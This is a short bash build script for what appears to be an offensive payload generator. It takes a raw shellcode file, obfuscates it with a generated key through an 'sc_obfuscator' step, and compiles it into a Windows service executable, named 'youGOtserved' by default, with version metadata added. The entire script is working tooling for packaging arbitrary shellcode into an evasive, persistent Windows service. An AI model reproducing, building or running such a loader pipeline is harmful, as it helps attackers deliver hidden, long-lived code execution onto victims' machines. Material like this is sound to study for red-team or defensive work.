#!/bin/bash
echo [+] Generating a Go Windows service executable
rm -rf payloads
mkdir payloads
command -v go > /dev/null || { \
    echo "[!] Go is required, please install it"; exit 1; }
command -v goversioninfo > /dev/null || { \
    echo "[-] goversioninfo needs to be installed, installing now"; \
    go install \
    github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest; \
}
if [[ $# -lt 1 ]]; then
    echo "[!] Invalid number or arguments."
    echo "Usage:"
    echo "$0 /path/to/payload.bin [service_name]"
    exit 1
fi
service_name=${2:-youGOtserved}
sc_fullpath=$(realpath "$1")
echo "[+] Full path of payload file: $sc_fullpath"
cd sc_obfuscator || exit 1
echo "[+] Generating key file..."
go generate
echo "[+] Jumbling shellcode and writing to DLL generator..."
go run sc_obfuscator -payload "$sc_fullpath"
echo "[+] Payload file written"
echo "[+] Copying key file to service EXE directory..."
cp key.bin ../goSvc/
cd ../goSvc/ || exit 1
echo "[+] Building the service EXE..."
./build_svc_exe_on_linux.sh "$service_name"
mv "$service_name.exe" ../payloads/
echo "[+] Done, $service_name will be in the payloads directory"
echo "[+] WOOOOOO, have a nice day!"
